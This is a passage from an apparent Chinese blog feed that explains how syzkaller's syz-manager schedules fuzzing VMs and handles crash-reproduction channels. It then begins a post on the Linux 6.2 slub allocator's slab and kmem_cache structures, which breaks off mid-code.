class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这两个函数主要就是通过如下调用链来在 VM 中执行程序，这里就不展开了：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">context.test<span class="hljs-constructor">Prog()</span><br>context.test<span class="hljs-constructor">Progs()</span><br>context.test<span class="hljs-constructor">WithInstance()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProg()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProgFile()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExecProgInstance</span>.</span></span>run<span class="hljs-constructor">Command()</span><br></code></pre></td></tr></table></figure><h4 id="②-循环启动协程进行-fuzzing"><a href="#②-循环启动协程进行-fuzzing" class="headerlink" title="② 循环启动协程进行 fuzzing"></a>② 循环启动协程进行 fuzzing</h4><p>此时已经不满足可以进行 crash 复现的条件了，因而会有第二个小循环启动新协程<strong>将资源池中剩余 VM 调度去 fuzzing</strong>， 并将结果输出到 <code>runDone</code> 中： </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> !canRepro() &#123;<br>idx := instances.TakeOne()<br><span class="hljs-keyword">if</span> idx == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting instance %v&quot;</span>, *idx)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>crash, err := mgr.runInstance(*idx)<br>runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;<br>&#125;()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstance()</code> 函数实际上会调用 <code>runInstanceInner()</code>，该函数<strong>仅当产生了 Crash 时返回的结果才不为 nil，即 runRepro 队列实际上为 Crash 队列：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstance(index <span class="hljs-type">int</span>) (*Crash, <span class="hljs-type">error</span>) &#123;<br>mgr.checkUsedFiles()<br>instanceName := fmt.Sprintf(<span class="hljs-string">&quot;vm-%d&quot;</span>, index)<br><br>rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)<br><br>machineInfo := mgr.serv.shutdownInstance(instanceName)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmInfo) != <span class="hljs-number">0</span> &#123;<br>machineInfo = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>(vmInfo, <span class="hljs-string">&#x27;\n&#x27;</span>), machineInfo...)<br>&#125;<br><br><span class="hljs-comment">// Error that is not a VM crash.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// No crash.</span><br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br>crash := &amp;Crash&#123;<br>vmIndex:     index,<br>hub:         <span class="hljs-literal">false</span>,<br>Report:      rep,<br>machineInfo: machineInfo,<br>&#125;<br><span class="hljs-keyword">return</span> crash, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstanceInner()</code> 的核心部分主要是：</p><ul><li><p>调用 <code>vmPool.Create()</code> 创建 VM，调用 <code>inst.Forward()</code> 进行 TCP 转发，拷贝 <code>syz-fuzzer</code> 与 <code>syz-executor</code> 到 VM 文件系统中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstanceInner(index <span class="hljs-type">int</span>, instanceName <span class="hljs-type">string</span>) (*report.Report, []<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>inst, err := mgr.vmPool.Create(index)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create instance: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inst.Close()<br><br>fwdAddr, err := inst.Forward(mgr.serv.port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to setup port forwarding: %v&quot;</span>, err)<br>&#125;<br><br>fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// 若提供了 ExecutorBin , 这意味着 syz-executor 早已在镜像中,</span><br><span class="hljs-comment">// 故无需进行拷贝.</span><br>executorBin := mgr.sysTarget.ExecutorBin<br><span class="hljs-keyword">if</span> executorBin == <span class="hljs-string">&quot;&quot;</span> &#123;<br>executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br>fuzzerV := <span class="hljs-number">0</span><br>procs := mgr.cfg.Procs<br><span class="hljs-keyword">if</span> *flagDebug &#123;<br>fuzzerV = <span class="hljs-number">100</span><br>procs = <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>instance.FuzzerCmd()</code> 生成命令行后调用 <code>inst.Run()</code> 启动 <code>syz-fuzzer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Run the fuzzer binary.</span><br>start := time.Now()<br>atomic.AddUint32(&amp;mgr.numFuzzing, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>  <br>args := &amp;instance.FuzzerCmdArgs&#123;<br>Fuzzer:    fuzzerBin,<br>Executor:  executorBin,<br>Name:      instanceName,<br>OS:        mgr.cfg.TargetOS,<br>Arch:      mgr.cfg.TargetArch,<br>FwdAddr:   fwdAddr,<br>Sandbox:   mgr.cfg.Sandbox,<br>Procs:     procs,<br>Verbosity: fuzzerV,<br>Cover:     mgr.cfg.Cover,<br>Debug:     *flagDebug,<br>Test:      <span class="hljs-literal">false</span>,<br>Runtest:   <span class="hljs-literal">false</span>,<br>Optional: &amp;instance.OptionalFuzzerArgs&#123;<br>Slowdown:   mgr.cfg.Timeouts.Slowdown,<br>RawCover:   mgr.cfg.RawCover,<br>SandboxArg: mgr.cfg.SandboxArg,<br>&#125;,<br>&#125;<br>cmd := instance.FuzzerCmd(args)<br>outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to run fuzzer: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>inst.MonitorExecution()</code> 监控 VM 运行，该函数主要是<strong>通过获取 kernel oops 来判断是否触发了 crash</strong>（KASAN 不会造成 kernel panic，从而使得一个 VM 实例长期运行，不过 dmesg 中仍有 oops）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmInfo []<span class="hljs-type">byte</span><br>rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)<br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// This is the only &quot;OK&quot; outcome.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>vmInfo, err = inst.Info()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInfo = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error getting VM info: %v\n&quot;</span>, err))<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> rep, vmInfo, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Step-3-等待处理不同-channel-数据"><a href="#Step-3-等待处理不同-channel-数据" class="headerlink" title="Step 3. 等待处理不同 channel 数据"></a>Step 3. 等待处理不同 channel 数据</h3><p><code>vmLoop()</code> 的最后主要就是一个大的 <code>select</code>，等待某个 channel 中有数据后进行处理，之后重新跳回等待处理或是开始下一轮循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stopRequest <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;<br>stopRequest = mgr.vmStop<br>&#125;<br><br>wait:<br><span class="hljs-keyword">select</span> &#123;<br></code></pre></td></tr></table></figure><p>首先是资源池的 <code>Freed</code> channel，在 <code>Put()</code> 中会将空闲 VM idx 放回资源池后向该 channel 送入一个 <code>true</code>，而这里什么都没有做，笔者估计会在后续版本中更新：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-instances.Freed:<br><span class="hljs-comment">// An instance has been released.</span><br></code></pre></td></tr></table></figure><p><code>stopRequest</code> 其实是 <code>Manager.vmStop</code> ，这个 channel 会在 VM instance 所实现的 <code>Run()</code> 方法中被使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> stopRequest &lt;- <span class="hljs-literal">true</span>:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: issued stop request&quot;</span>)<br>stopPending = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>当 <code>runDone</code> 中有数据时说明<strong>fuzz 产生了 crash</strong>，此时会将产生 crash 的 VM 释放回资源池，将 crash 写入 <code>pendingRepro</code> 表中等待下一轮循环进行处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-runDone:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &amp;&amp; shutdown != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v&quot;</span>, res.err)<br>&#125;<br>stopPending = <span class="hljs-literal">false</span><br>instances.Put(res.idx)<br><span class="hljs-comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span><br><span class="hljs-comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span><br><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &amp;&amp; res.crash != <span class="hljs-literal">nil</span> &#123;<br>needRepro := mgr.saveCrash(res.crash)<br><span class="hljs-keyword">if</span> needRepro &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)<br>pendingRepro[res.crash] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reproDone</code> 中为 crash 的复现结果，这里会保存复现结果并将对应的 crash 从 <code>reproducing</code> 表中删除</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-reproDone:<br>atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>crepro := <span class="hljs-literal">false</span><br>title := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> res.repro != <span class="hljs-literal">nil</span> &#123;<br>crepro = res.repro.CRepro<br>title = res.repro.Report.Title<br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,<br>res.instances, res.report0.Title, res.repro != <span class="hljs-literal">nil</span>, crepro, title)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;repro failed: %v&quot;</span>, res.err)<br>&#125;<br><span class="hljs-built_in">delete</span>(reproducing, res.report0.Title)<br><span class="hljs-keyword">if</span> res.repro == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !res.hub &#123;<br>mgr.saveFailedRepro(res.report0, res.stats)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mgr.saveRepro(res)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shutdown</code> 中有数据则表示收到了终止信号，此时会将 <code>shutdown</code> 置为 nil，终止循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-shutdown:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: shutting down...&quot;</span>)<br>shutdown = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>hubReproQueue</code> 上也可能传来 crash，此处将其送入 <code>pendingRepro</code> 表中等待在后续循环中复现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> crash := &lt;-mgr.hubReproQueue:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: get repro from hub&quot;</span>)<br>pendingRepro[crash] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>needMoreRepros</code> 是一个传输 channel 的 channel，这里会将一个条件判断结果传入传来的 channel 中并重新跳回等待：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.needMoreRepros:<br>reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;<br><span class="hljs-built_in">len</span>(reproQueue)+<span class="hljs-built_in">len</span>(pendingRepro)+<span class="hljs-built_in">len</span>(reproducing) == <span class="hljs-number">0</span><br><span class="hljs-keyword">goto</span> wait<br></code></pre></td></tr></table></figure><p>最后是 <code>reproRequest</code>，该 channel 意为<strong>主动进行复现的请求</strong>，这里会拷贝 <code>reproducing</code> 位图后将其传入传来的 channel 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.reproRequest:<br>repros := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> title := <span class="hljs-keyword">range</span> reproducing &#123;<br>repros[title] = <span class="hljs-literal">true</span><br>&#125;<br>reply &lt;- repros<br><span class="hljs-keyword">goto</span> wait<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，<code>syz-manager</code> 的基本运行逻辑分析完毕</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;宁就是👴の Manager 🐎&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/categories/FUZZ/"/>
    
    
    <category term="漏洞挖掘" scheme="https://arttnba3.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="https://arttnba3.github.io/tags/syzkaller/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x04】Linux Kernel 内存管理浅析 III - Slub Allocator</title>
    <link href="https://arttnba3.github.io/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/"/>
    <id>https://arttnba3.github.io/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/</id>
    <published>2023-02-23T15:24:42.000Z</published>
    <updated>2023-10-27T11:53:18.261Z</updated>
    
    <content type="html"><![CDATA[<p>别人问你哪里丑态你再把他反手挂到自己的小 slub 里寻求认同</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>因为这系列文章🕊🕊🕊太久了，内核的内存管理也发生了一定的变化，所以本文直接用最新的 6.2 版本的内核源码：）</p></blockquote><p>在<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">上一篇文章</a> 中笔者简要介绍了 buddy system 的基本流程，但其为一个「页」这一级的 allocator，在日常生活中使用（？）难免有些浪费，因为内核中需要动态内存分配的场景虽然很多，但是我们<strong>通常并不需要使用一整页起步的内存，而往往是需要分配一些比较小的对象</strong>——因此 slab allocator 应运而生，其代替我们向 buddy system 请求内存页，并分割为多个小的 object，当我们每次需要时只需要取一个 object 即可</p><blockquote><p>slab 又被称为内核的堆（heap）内存管理，因为其与用户态的内存“堆”（heap）类似，都是动态分配的内存</p></blockquote><p>slab allocator 一共有三种版本：</p><ul><li>slab（最初的版本，机制比较复杂，效率不高）</li><li>slob（用于嵌入式等场景的极为简化版本）</li><li><strong>slub</strong>（优化后的版本，<strong>现在的通用版本</strong>）</li></ul><blockquote><p>这三种内存分配器的顶层 API 是一致的，但内部实现是不一致的（例如 slab 和 slub 各自有一个对 <code>kmem_cache</code> 的不同定义）</p></blockquote><p>本篇文章中我们主要介绍的是 <strong>slub</strong> ，也是现在内核中最为通用的小对象分配器</p><h1 id="0x01-slub-allocator-的基本结构"><a href="#0x01-slub-allocator-的基本结构" class="headerlink" title="0x01. slub allocator 的基本结构"></a>0x01. slub allocator 的基本结构</h1><p>首先来一张 Overview：</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h2 id="一、slab：单份-object-池"><a href="#一、slab：单份-object-池" class="headerlink" title="一、slab：单份 object 池"></a>一、slab：单份 object 池</h2><p>Linux kernel 中用以统筹所有内存的依然是 buddy system，slub allocator 也不例外，其负责向 buddy system 请求内存后分割给多个小 object 后再返还给上层调用者，<strong>单次向 buddy system 所请求的一份连续内存页便称之为一张 slab</strong>，在内核中对应 <code>slab</code> 结构体，<strong>本质上是复用 page 结构体</strong>：</p><blockquote><p>这里我们仅关注 slub，所以笔者仅截取 slub 所需字段</p><blockquote><p>老版本中 slab 是直接内嵌在 page 结构体中的</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* 剩余的 slabs 数量 */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* 第一个空闲对象 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>slab_cache</code> ：该 slab 对应的内存池</li><li><code>freelist</code> ：<strong>Slab 上的空闲对象组织为一个 NULL 结尾的单向链表</strong>，该指针指向第一个空闲对象，耗尽时为 NULL</li><li><code>slab_list</code> ：按用途连接多个 slabs 的双向链表</li><li><code>inuse</code> ：已被使用的对象数量</li><li><code>objects</code>：该 slab 上的对象总数</li><li><code>frozen</code>：是否被冻结，即<strong>已经归属于特定的 CPU</strong></li></ul><blockquote><p>这里我们需要注意的是 <strong>counters 成员直接涵盖了 inuse &amp; objects &amp; frozen</strong>，后面会有大量的直接通过 counters 成员进行赋值的操作，<strong>实际上就是赋值了 inuse &amp; objects &amp; frozen</strong></p></blockquote><p>正如一个 page 结构体直接对应一张内存页（或复合页），复用了 page 结构体的 slab 也<strong>直接对应一份 slab 内存页</strong>，借助 <code>page_to_pfn()</code> 等函数可以直接完成 slab 结构体到对应内存页虚拟地址的转换，反之亦然，即<strong>我们可以直接通过一个空闲对象的虚拟地址找到对应的 slab 结构体</strong></p><p><img src="https://s2.loli.net/2023/02/21/cBXCGF4Z18VLMzl.png" alt="image.png"></p><h2 id="二、kmem-cache：特定大小-amp-用途对象（堆块）的内存池"><a href="#二、kmem-cache：特定大小-amp-用途对象（堆块）的内存池" class="headerlink" title="二、kmem_cache：特定大小&amp;用途对象（堆块）的内存池"></a>二、kmem_cache：特定大小&amp;用途对象（堆块）的内存池</h2><p><code>kmem_cache</code> 为一个基本的 allocator 组件，可以理解为 <strong>用于分配某个特定大小（某种特定用途）的对象的内存池</strong>，所有的 kmem_cache 构成一个双向链表，并存在一个对应的通用 <code>kmem_cache</code> 数组 <code>kmalloc_caches</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span 